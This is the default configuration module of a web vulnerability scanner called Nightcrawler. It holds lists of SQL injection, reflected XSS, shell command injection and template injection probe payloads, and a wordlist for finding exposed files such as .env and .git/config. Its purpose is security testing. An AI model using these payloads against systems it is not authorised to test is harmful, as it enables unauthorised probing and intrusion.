# nightcrawler/config.py
# This file contains the default configuration constants for Nightcrawler.

from typing import List, Set

# Import version to be used in the default User-Agent string
try:
    from nightcrawler import __version__ as nightcrawler_version
except ImportError:
    nightcrawler_version = "unknown"

# --- Default Payloads and Scanner Settings ---
DEFAULT_SQLI_PAYLOADS: List[str] = [
    "'",
    "''",
    "'\"",
    "\"",
    "\"'",
    "`",
    "``",
    "`\"",
    "\\",
    "\\'",
    "\\\"",
    "AND 1=1",
    "AND 1=0",
    "OR 1=1",
    "OR 1=0",
    "' AND 1=1",
    "' AND 1=0",
    "' OR 1=1",
    "' OR 1=0",
    "\" AND 1=1",
    "\" AND 1=0",
    "\" OR 1=1",
    "\" OR 1=0",
    "' OR '1'='1",
    "' OR 'a'='a",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "') OR ('1'='1",
    "ORDER BY 1",
    "ORDER BY 99",
    "ORDER BY 1--",
    "ORDER BY 99--",
    "' ORDER BY 1--",
    "' ORDER BY 99--",
    "UNION SELECT 1",
    "UNION SELECT 1,2,3",
    "' UNION SELECT 1,2,3--",
    "AND SLEEP(5)",
    "OR SLEEP(5)",
    "' OR SLEEP(5)--",
    "pg_sleep(5)",
    "' OR pg_sleep(5)--",
]
DEFAULT_XSS_REFLECTED_PAYLOADS: List[str] = [
    "<script>alert('XSSR')</script>",
    "'\"><script>alert('XSSR')</script>",
    "'\"/><svg/onload=alert('XSSR')>",
    "<img src=x onerror=alert('XSSR')>",
    "<details/open/ontoggle=alert('XSSR')>",
    "<body onpageshow=alert('XSSR')>",
    "<iframe src=\"javascript:alert('XSSR')\">",
    "<plaintext>",
    "javascript:alert('XSSR')",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTUicpPC9zY3JpcHQ+",
    "&lt;script&gt;alert('XSSR')&lt;/script&gt;",
    "%3cscript%3ealert('XSSR')%3c/script%3e",
    "'\";alert('XSSR');\"",
    "<a href=\"javascript:alert('XSSR')\">Click me</a>",
    "<style>xss:expression(alert('XSSR'))</style>",
    "<xml id=xss><xss:script>alert('XSSR')</xss:script>",
    "<!--<script>alert('XSSR')//-->",
    "a' onmouseover=alert('XSSR')",
    "<video/poster/onerror=alert('XSSR')>",
    "<audio src/onerror=alert('XSSR')>",
    "<body/onpageshow=alert('XSSR')>",
]
DEFAULT_XSS_STORED_PREFIX: str = "ncXSS"
DEFAULT_XSS_STORED_FORMAT: str = "nightcrawler_xss_probe_{probe_id}"
# DEFAULT_XSS_STORED_FORMAT: str = "[[probe_id:{probe_id}]]" # Safe format
DEFAULT_PAYLOAD_MAX_AGE: int = 3600  # 1 hour in seconds

# --- ADDED: Payloads for new scanners ---
DEFAULT_CMD_INJECTION_PAYLOADS: List[str] = [
    "| sleep 5 #",
    "&& sleep 5",
    "; sleep 5",
    "| echo $((1337*1337))",
    "&& echo $((1337*1337))",
    "; echo $((1337*1337))",
]
DEFAULT_SSTI_PAYLOADS: List[str] = ["{{1337*1337}}", "${1337*1337}", "<%= 1337*1337 %>", "#{1337*1337}"]

# --- Default Worker and Client Settings ---
DEFAULT_MAX_CONCURRENCY: int = 5
DEFAULT_USER_AGENT: str = f"Nightcrawler-MITM/{nightcrawler_version}"

# --- Default Content Discovery Settings ---
DEFAULT_DISCOVERY_WORDLIST: Set[str] = {
    ".git/HEAD",
    ".git/config",
    ".gitignore",
    ".env",
    "config.json",
    "docker-compose.yml",
    "package.json",
    "web.config",
    "README.md",
    "backup",
    "temp",
    "tmp",
    "admin",
    "dashboard",
    "logs",
    "test.php",
    "info.php",
    "index.php.bak",
    "index.html.old",
}

# --- Confidence Levels ---
CONFIDENCE_LOW = 1
CONFIDENCE_MEDIUM = 2
CONFIDENCE_HIGH = 3

CONFIDENCE_LEVELS = {
    "LOW": CONFIDENCE_LOW,
    "MEDIUM": CONFIDENCE_MEDIUM,
    "HIGH": CONFIDENCE_HIGH,
}

DEFAULT_MIN_CONFIDENCE = "MEDIUM"

# End of nightcrawler/config.py
